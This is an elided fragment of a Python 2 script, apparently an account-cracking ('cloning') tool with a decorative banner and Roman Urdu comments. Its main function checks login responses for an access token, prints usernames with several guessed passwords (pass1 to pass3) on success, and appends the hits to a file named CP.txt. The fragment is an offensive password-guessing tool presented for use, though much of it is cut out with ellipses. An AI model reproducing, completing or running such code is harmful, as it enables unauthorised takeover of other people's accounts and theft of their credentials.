...
/❏ ❐ ❑ ❒ ❏ ❐ ❏ ❐ ❑ ❒ ❏ ❐❉ ╧╧╧╧ ✿ ╧╧╧╧ ❉
/══════ •『 ♡ 』• ════════════ •『 ♡ 』• ════════════ •『 ♡ 』• ════════════ •『 ♡ 』• ════════════ •『 ♡ 』• ═══════════ ✥.❖.✥ ══════════ ✥.❖.✥ ═════════════ ◖◍◗ ════════════════ ◖◍◗ ════════════════ ◖◍◗ ════════  
/ PORA LOGO MAKE BY ALI 🤣🤣😕👈
/ EXIT K9R0 CL0NING AB 
/ WHTSAPP JS KO COMMNAD BNWANA HAN FR33 MAIN 
/ OR BATAO KASA HO 
/ L0V3 Y0U M0M DAD ☺️                                                                            ​                                                                                     
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[92m  [ali=ok]  ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m  [ali=ok] ' + k + c + user + '  |  ' + pass2
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m  [ali=ok]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/CP.txt', 'a')
